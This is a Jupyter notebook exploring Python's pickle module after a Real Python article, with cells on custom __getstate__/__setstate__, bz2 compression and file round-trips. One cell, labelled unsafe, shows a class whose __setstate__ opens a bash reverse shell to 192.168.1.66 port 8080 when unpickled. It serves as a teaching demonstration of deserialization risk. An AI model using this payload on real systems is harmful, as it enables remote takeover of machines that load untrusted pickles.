{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scripts to try the pickle library\n",
    "\n",
    "This code was taken from a Real Python article:\n",
    "\n",
    "https://realpython.com/python-pickle-module/#compression-of-pickled-objects"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'dill'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-7-6811cc16f03d>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[1;32m----> 1\u001b[1;33m \u001b[1;32mimport\u001b[0m \u001b[0mdill\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'dill'"
     ]
    }
   ],
   "source": [
    "import dill"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import bz2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "a = 'ñasldhoaihd{l oisdf aisiuujdhfñ}'\n",
    "pickled_a = pickle.dumps(a)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x80\\x03X\"\\x00\\x00\\x00\\xc3\\xb1asldhoaihd{l oisdf aisiuujdhf\\xc3\\xb1}q\\x00.'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pickled_a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'a': 35, 'b': 'test'}\n"
     ]
    }
   ],
   "source": [
    "class foobar:\n",
    "    def __init__(self):\n",
    "        self.a = 35\n",
    "        self.b = \"test\"\n",
    "        self.c = lambda x: x * x\n",
    "\n",
    "    def __getstate__(self):\n",
    "        attributes = self.__dict__.copy()\n",
    "        del attributes['c']\n",
    "        return attributes\n",
    "\n",
    "my_foobar_instance = foobar()\n",
    "my_pickle_string = pickle.dumps(my_foobar_instance)\n",
    "my_new_instance = pickle.loads(my_pickle_string)\n",
    "\n",
    "print(my_new_instance.__dict__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'a': 35, 'b': 'test', 'c': <function foobar.__setstate__.<locals>.<lambda> at 0x0000011EBA5F7730>}\n"
     ]
    }
   ],
   "source": [
    "class foobar:\n",
    "    def __init__(self):\n",
    "        self.a = 35\n",
    "        self.b = \"test\"\n",
    "        self.c = lambda x: x * x\n",
    "\n",
    "    def __getstate__(self):\n",
    "        attributes = self.__dict__.copy()\n",
    "        del attributes['c']\n",
    "        return attributes\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        self.__dict__ = state\n",
    "        self.c = lambda x: x * x\n",
    "\n",
    "my_foobar_instance = foobar()\n",
    "my_pickle_string = pickle.dumps(my_foobar_instance)\n",
    "my_new_instance = pickle.loads(my_pickle_string)\n",
    "print(my_new_instance.__dict__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "312\n",
      "256\n"
     ]
    }
   ],
   "source": [
    "my_string = \"\"\"Per me si va ne la città dolente,\n",
    "... per me si va ne l'etterno dolore,\n",
    "... per me si va tra la perduta gente.\n",
    "... Giustizia mosse il mio alto fattore:\n",
    "... fecemi la divina podestate,\n",
    "... la somma sapienza e 'l primo amore;\n",
    "... dinanzi a me non fuor cose create\n",
    "... se non etterne, e io etterno duro.\n",
    "... Lasciate ogne speranza, voi ch'intrate.\"\"\"\n",
    "pickled = pickle.dumps(my_string)\n",
    "compressed = bz2.compress(pickled)\n",
    "print(len(my_string))\n",
    "\n",
    "print(len(compressed))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import pickle\n",
    "\n",
    "class foobar:\n",
    "    '''Unsafe class: the __setstate__ method could give access to a remote a terminal'''\n",
    "    def __init__(self):\n",
    "        pass\n",
    "\n",
    "    def __getstate__(self):\n",
    "        return self.__dict__\n",
    "\n",
    "    def __setstate__(self, state):\n",
    "        # The attack is from 192.168.1.10\n",
    "        # The attacker is listening on port 8080\n",
    "        os.system('''/bin/bash -c\n",
    "                  \"/bin/bash -i >& /dev/tcp/192.168.1.66/8080 0>&1\"''')\n",
    "\n",
    "my_foobar = foobar()\n",
    "my_pickle = pickle.dumps(my_foobar)\n",
    "my_unpickle = pickle.loads(my_pickle)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('borrar.pkl', 'wb') as f:\n",
    "    pickle.dump(a, f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ñasldhoaihd{l oisdf aisiuujdhfñ}'"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open('borrar.pkl', 'rb') as f:\n",
    "    unpckl_a = pickle.load(f)\n",
    "unpckl_a"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
